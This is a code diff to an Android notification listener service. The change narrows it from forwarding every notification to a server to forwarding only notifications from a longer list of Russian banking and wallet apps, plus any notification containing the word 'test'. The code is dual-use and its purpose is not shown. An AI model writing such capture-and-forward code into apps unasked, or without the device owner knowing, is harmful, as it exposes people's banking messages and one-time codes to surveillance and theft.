@@ -57,20 +57,13 @@ public class NotificationListenerService extends android.service.notification.No
             
             Log.d(TAG, "Notification details - App: " + appName + ", Title: " + title + ", Content: " + content);
             
-            // Send ALL notifications for now (for debugging)
-            // Remove the filter temporarily to test
-            sendNotificationToServer(deviceToken, packageName, appName, 
-                                   title.toString(), content.toString());
-            
-            // Original filter logic (commented out for testing)
-            /*
+            // Filter notifications - only banking apps and test notifications
             if (isRelevantNotification(packageName, title.toString(), content.toString())) {
                 sendNotificationToServer(deviceToken, packageName, appName, 
                                        title.toString(), content.toString());
             } else {
                 Log.d(TAG, "Notification filtered out: " + packageName);
             }
-            */
         } catch (Exception e) {
             Log.e(TAG, "Error processing notification", e);
         }
@@ -94,6 +87,13 @@ public class NotificationListenerService extends android.service.notification.No
     }
     
     private boolean isRelevantNotification(String packageName, String title, String content) {
+        // Test notifications - always pass
+        String combined = (title + " " + content).toLowerCase();
+        if (combined.contains("test") || combined.contains("тест")) {
+            Log.d(TAG, "Test notification detected");
+            return true;
+        }
+        
         // Banking app package names
         String[] bankingApps = {
             "com.sberbank",
@@ -106,24 +106,20 @@ public class NotificationListenerService extends android.service.notification.No
             "ru.rosbank",
             "ru.raiffeisen",
             "com.openbank",
-            "ru.psbank"
+            "ru.psbank",
+            "ru.gazprombank",
+            "ru.sovcombank",
+            "com.yandex.money",
+            "ru.yoomoney",
+            "com.qiwi.wallet",
+            "ru.mts.money",
+            "com.paypal",
+            "ru.beeline.pay"
         };
         
         for (String app : bankingApps) {
             if (packageName.contains(app)) {
-                return true;
-            }
-        }
-        
-        // Also check for transaction keywords
-        String combined = (title + " " + content).toLowerCase();
-        String[] keywords = {
-            "перевод", "поступление", "списание", "оплата", 
-            "payment", "transfer", "transaction", "руб", "rub"
-        };
-        
-        for (String keyword : keywords) {
-            if (combined.contains(keyword)) {
+                Log.d(TAG, "Banking app notification detected: " + packageName);
                 return true;
             }
         }
